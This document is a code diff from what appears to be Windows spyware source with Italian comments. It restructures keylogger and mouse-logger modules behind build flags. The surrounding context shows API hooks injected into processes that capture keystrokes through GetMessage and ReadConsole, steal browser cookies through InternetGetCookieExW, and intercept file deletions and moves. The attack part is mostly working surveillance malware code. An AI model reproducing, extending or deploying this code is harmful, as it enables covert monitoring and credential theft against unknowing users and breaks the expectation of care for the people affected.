@@ -52,6 +52,11 @@
 #include <Strsafe.h>
 #include "config.h"
 
+// modules
+#ifdef __ENABLE_KEYLOG_MODULE
+#include "../modules/keylog/HM_KeyLog.h"
+#endif
+
 // Prototipi usati per comodita'
 void HM_U2A(char *buffer);
 void LockConfFile();
@@ -104,11 +109,13 @@ void PM_MoneyRegister();
 #pragma comment(lib, "application")
 #endif
 
+#if defined(__ENABLE_KEYLOG_MODULE) || defined(__ENABLE_MOUSE_MODULE)
+#pragma comment(lib, "keylog")
+#endif
 /// SECTION for building modules
 
 #include <json/JSON.h>
 #include "HM_ProcessMonitors.h" // XXX da modificare
-#include "HM_KeyLog.h" // XXX da modificare
 #include "HM_SnapShot.h" // XXX da modificare
 #include "HM_WiFiLocation.h" // XXX da modificare
 void PM_PrintAgentRegister();
@@ -121,8 +128,6 @@ void PM_MailCapRegister();
 #include "HM_Pstorage.h" // XXX da modificare 
 extern void PM_IMRegister();	// defined in /modules/imagent
 #include "HM_LogDevice.h" // XXX da modificare 
-
-#include "HM_MouseLog.h" // XXX da modificare
 
 void PM_SocialAgentRegister();
 
@@ -954,6 +959,7 @@ void __stdcall HM_sInBundleHook(DWORD dwPid, HMServiceStruct * pServiceData, BOO
 	HMMAKE_HOOK(dwPid, "DeleteFileW", PM_DeleteFile, CreateFileData, PM_CreateFile_setup, pServiceData, "KERNEL32.dll");
 	HMMAKE_HOOK(dwPid, "MoveFileW", PM_MoveFile, CreateFileData, PM_CreateFile_setup, pServiceData, "KERNEL32.dll");
 
+#ifdef __ENABLE_KEYLOG_MODULES
 	// --- PM per il keylog agent
 	HMMAKE_HOOK(dwPid, "GetMessageA", PM_GetMessage, GetMessageData, PM_GetMessage_setup, pServiceData, "user32.dll");
 	HMMAKE_HOOK(dwPid, "GetMessageW", PM_GetMessage, GetMessageData, PM_GetMessage_setup, pServiceData, "user32.dll");
@@ -966,6 +972,7 @@ void __stdcall HM_sInBundleHook(DWORD dwPid, HMServiceStruct * pServiceData, BOO
 	HMMAKE_HOOK(dwPid, "ReadConsoleW", PM_ReadConsoleW, GetMessageData, PM_GetMessage_setup, pServiceData, "kernel32.dll");
 	HMMAKE_HOOK(dwPid, "ReadConsoleInputExA", PM_ReadConsoleInputEx, GetMessageData, PM_GetMessage_setup, pServiceData, "kernel32.dll");
 	HMMAKE_HOOK(dwPid, "ReadConsoleInputExW", PM_ReadConsoleInputEx, GetMessageData, PM_GetMessage_setup, pServiceData, "kernel32.dll");
+#endif
 
 	// Per i cookie del social
 	HMMAKE_HOOK(dwPid, "InternetGetCookieExW", PM_InternetGetCookieEx, InternetGetCookieExData, PM_InternetGetCookieEx_setup, pServiceData, "wininet.dll");
